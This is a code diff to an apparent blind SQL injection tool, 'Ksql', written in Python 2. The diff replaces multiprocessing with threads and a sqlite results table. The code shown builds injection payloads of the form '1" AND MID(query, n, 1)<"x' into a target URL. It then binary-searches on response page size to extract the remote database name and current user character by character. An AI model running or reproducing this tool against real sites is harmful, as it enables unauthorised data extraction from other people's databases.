@@ -7,7 +7,7 @@ version:	Ksql 1.0
 """
 
 import sys, os, io, inspect, string, time, urllib, re, urlparse, difflib, chardet
-import filecmp, json, datetime, multiprocessing, getopt
+import filecmp, json, datetime, sqlite3, threading, getopt
 import xml.etree.ElementTree as ET
 from core import stdout
 from difflib import *
@@ -56,10 +56,24 @@ def createBinarySql(url, type, num, midval):
 		url.replace('[[[ID]]]', '1" AND MID(%s, %d, 1)<"%s' % (QueriesDBMS.find(type).get('query'), num, midval))
 	)
 
-def worker(type, tmpUrl, num, succPageSize):
+sqlliteCon    = sqlite3.connect(':memory:', check_same_thread=False)
+#sqlliteCon    = sqlite3.connect(KSQL_ROOT_PATH + '/ksql.db', check_same_thread=False)
+sqlliteCursor = sqlliteCon.cursor()
+sqlliteCon.execute('drop table if exists info')
+sqlliteCon.commit()
+sqlliteCon.execute('create table info(id integer primary key autoincrement,type varchar(10) UNIQUE,value varchar(50))')
+sqlliteCon.execute('insert into info(type, value) values("--current-db", "")')
+sqlliteCon.execute('insert into info(type, value) values("--current-user", "")')
+sqlliteCon.commit()
+
+def worker(type, tmpUrl, num, succPageSize, lock):
+	lock.acquire()
+
 	low = 0
 	high = len(ITOA64) - 1
-	while(low <= high):
+
+	while(low <= high):  
+
 		now = datetime.datetime.now()
 
 		mid = (low + high)/2  
@@ -78,7 +92,13 @@ def worker(type, tmpUrl, num, succPageSize):
 		elif len(htmlDecode(urllib.urlopen(highSql).read())) == succPageSize:
 			low = mid + 1
 		else:
-			return midval
+			sql = 'update info set value=value||"%s" where type="%s"' % (midval, type)
+			sqlliteCon.execute(sql)
+			sqlliteCon.commit()
+			stdout.printDarkGreen("[%s] [INFO] Hint %s \r\n" %(now.strftime('%H:%M:%S'), midval))
+			break
+
+	lock.release()
 
 def manage(type, url):
 	values = url.split('?')[-1]
@@ -107,21 +127,23 @@ def manage(type, url):
 			blindCount = num
 
 	''' Blind SQL Injection '''
-	pool = multiprocessing.Pool(processes=blindCount)
-	result = []
+	threads = []
+	lock = threading.Lock()
 	for num in range(blindCount):
-		result.append(pool.apply_async(worker, (type, tmpUrl, num+1, succPageSize)))
-	pool.close()
-	pool.join()
+		threads.append(threading.Thread(target=worker, args=(type, tmpUrl, num+1, succPageSize, lock)))
 
-	resultStr = ''
-	for res in result:
-		resultStr += res.get()
+	for item in threads:
+		item.setDaemon(True)
+		item.start()
+	item.join()
+
+	cursor = sqlliteCursor.execute('select value from info where type="%s"' % type)
+	checkRes = cursor.fetchone()
 
 	if type == '--current-db':
-		stdout.printDarkYellow('Databse: ' + resultStr + "\r\n")
+		stdout.printDarkYellow('Databse: ' + checkRes[0] + "\r\n")
 	elif type == '--current-user':
-		stdout.printDarkYellow('User: ' + resultStr + "\r\n")
+		stdout.printDarkYellow('User: ' + checkRes[0] + "\r\n")
 
 def Usage():
 	print 'Ksql.py usage:'
